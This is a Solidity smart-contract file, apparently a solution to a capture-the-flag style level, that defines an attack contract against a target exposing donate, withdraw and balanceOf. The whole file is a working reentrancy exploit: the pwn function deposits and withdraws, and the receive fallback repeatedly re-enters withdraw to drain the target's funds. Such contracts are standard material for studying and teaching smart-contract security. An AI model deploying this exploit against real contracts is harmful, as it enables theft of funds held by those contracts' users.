// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address to) external payable;

    function withdraw(uint _amount) external;

    function balanceOf(address _who) external view returns (uint256);
}

contract AttackReentrance {
    IReentrance public reentrance;

    event Withdrawed(uint256 amount);
    event NotWithdrawed();

    constructor(IReentrance _reentrance) {
        reentrance = _reentrance;
    }

    function pwn() external payable {
        reentrance.donate(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        try reentrance.withdraw(reentrance.balanceOf(address(this))) {
            emit Withdrawed(reentrance.balanceOf(address(this)));
        } catch {
            emit NotWithdrawed();
        }
    }
}

